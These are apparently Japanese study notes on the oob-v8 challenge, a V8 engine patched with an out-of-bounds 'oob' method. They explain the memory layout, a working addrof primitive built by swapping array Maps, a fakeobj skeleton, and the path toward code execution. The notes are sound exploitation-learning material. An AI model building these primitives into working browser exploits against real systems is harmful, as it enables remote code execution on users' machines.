### exploit原語を理解する

oob-v8 exploitの典型的な流れ：
```
oob read/write
    ↓
addrof primitive（オブジェクトのアドレスリーク）
    ↓
fakeobj primitive（任意アドレスをオブジェクトとして扱う）
    ↓
arbitrary read/write
    ↓
WASM or JIT + shellcode → RCE
```

### メモリレイアウト

```
アドレス          内容
─────────────────────────────────────────────────────
dd50  [FixedDoubleArray]
        map pointer
dd58    length smi (= 2)
dd60    elements[0] = 1.5   ← a[0]
dd68    elements[1] = 2.5   ← a[1]
─────────────────────────────────────────────────────
dd70  [JSArray本体]         ← elementsの直後！
        map pointer         ← a.oob() が読み書きする場所
dd78    properties pointer
dd80    elements pointer
dd88    length smi

a.oob()はelements[length]、つまりelements[2]を読もうとします。
でも配列の要素はelements[0]とelements[1]しかないので、
elements[2]はFixedDoubleArrayの末尾の1つ先、すなわち**JSArray本体の先頭（= Mapポインタ）**にあたります。

a.oob()        // → JSArrayのMapポインタをfloatとして読む
a.oob(値)      // → JSArrayのMapポインタに書き込む

実際に確認
javascript// releaseビルドのd8で
a = [1.5, 2.5]
ftoi(a.oob()).toString(16)
// → "2a0a9af82ed9"  これがMapポインタ
GDBでx/4gx 0x30b708b4dd70した結果の先頭値0x00002a0a9af82ed9と一致する、という確認をしています。
```

### addrof primitive（オブジェクトのアドレスをリークする）
```
var float_arr = [1.5, 2.5];      // double配列
var obj_arr   = [{a:1}, {b:2}];  // オブジェクト配列
```

この2つはメモリ上で**要素の格納方法が根本的に違います**。

---

## 格納方法の違い
```
まず前提として、V8の配列には2種類あります

float_arr の elements:
┌──────────────┬──────────────┐
│ 1.5の実値    │ 2.5の実値    │
│(64bit float) │(64bit float) │
└──────────────┴──────────────┘
値をそのまま格納（pass by value）

obj_arr の elements:
┌──────────────┬──────────────┐
│ obj1への     │ obj2への     │
│ ポインタ     │ ポインタ     │
└──────────────┴──────────────┘
ポインタを格納（pass by reference）
obj_arr[0]を読むとき、V8は「elementsのポインタを辿って→そのアドレスのオブジェクトを返す」という2段階の処理をします。
どちらの動作をするかを決めているのがMapです。



var float_arr = [1.5, 2.5];
var map_float = float_arr.oob();  // float配列のMapを保存

var obj_arr = [{a:1}];
var map_obj = obj_arr.oob();      // object配列のMapを保存

function addrof(obj) {
    obj_arr[0] = obj;           // ①リークしたいobjを入れる
    obj_arr.oob(map_float);     // ②obj_arrのMapをfloat用に書き換える
    let leak = obj_arr[0];      // ③読み出す
    obj_arr.oob(map_obj);       // ④Mapを元に戻す
    return ftoi(leak);          // ⑤floatをBigIntに変換して返す
}

なぜアドレスがリークできるか

②でobj_arrのMapをfloat配列のMapに変えると、V8は「これはfloat配列だ」と思い込みます。
```
②の前（object配列として認識）:
  obj_arr[0]を読む
    → elementsのポインタを見る → 0xdeadbeef（obj1へのポインタ）
    → 0xdeadbeefに移動 → オブジェクトを返す   ← 2段階

②の後（float配列として認識）:
  obj_arr[0]を読む
    → elementsの値をそのままfloatとして返す → 0xdeadbeef がfloat値として返る
つまり「本当はポインタ（= objのアドレス）なのに、floatの数値としてそのまま返ってくる」のでアドレスがリークします

処理の流れの要約
① obj_arr[0] = obj          // elementsにobjへのポインタが書かれる
                             // 中身: 0xdeadbeef（objのアドレス）

② obj_arr.oob(map_float)    // 「float配列として扱え」という命令書に差し替える

③ leak = obj_arr[0]         // V8は「float配列だ」と思い込んでいるので
                             // 0xdeadbeefを「ポインタ」として辿らず
                             // そのまま「float値」として返してしまう

④ return ftoi(leak)          // 0xdeadbeefがfloatとして返ってきたのを
                             // BigIntに変換 → objのアドレスが得られる
```

### 基本primitiveを実装

```
// exploit.js のひな形
let oob_arr = new Array(1.1, 2.2, 3.3);
let obj_arr = [{}];

// oob readでobj_arrのelementsポインタを読む
// → addrof / fakeobj primitiveを組み立てる

function addrof(obj) {
    obj_arr[0] = obj;
    return oob_arr[/* offset */];
}

function fakeobj(addr) {
    oob_arr[/* offset */] = addr;
    return obj_arr[0];
}
```

### メモ

```
ポインタタギング・・・V8はポインタをaddr | 1（最下位ビットを1に）して保存するので、実際のアドレスは表示値から1を引いたものになる
JSArrayの実アドレス  = 0x30b708b4dd71 - 1 = 0x30b708b4dd70
elementsの実アドレス = 0x30b708b4dd51 - 1 = 0x30b708b4dd50
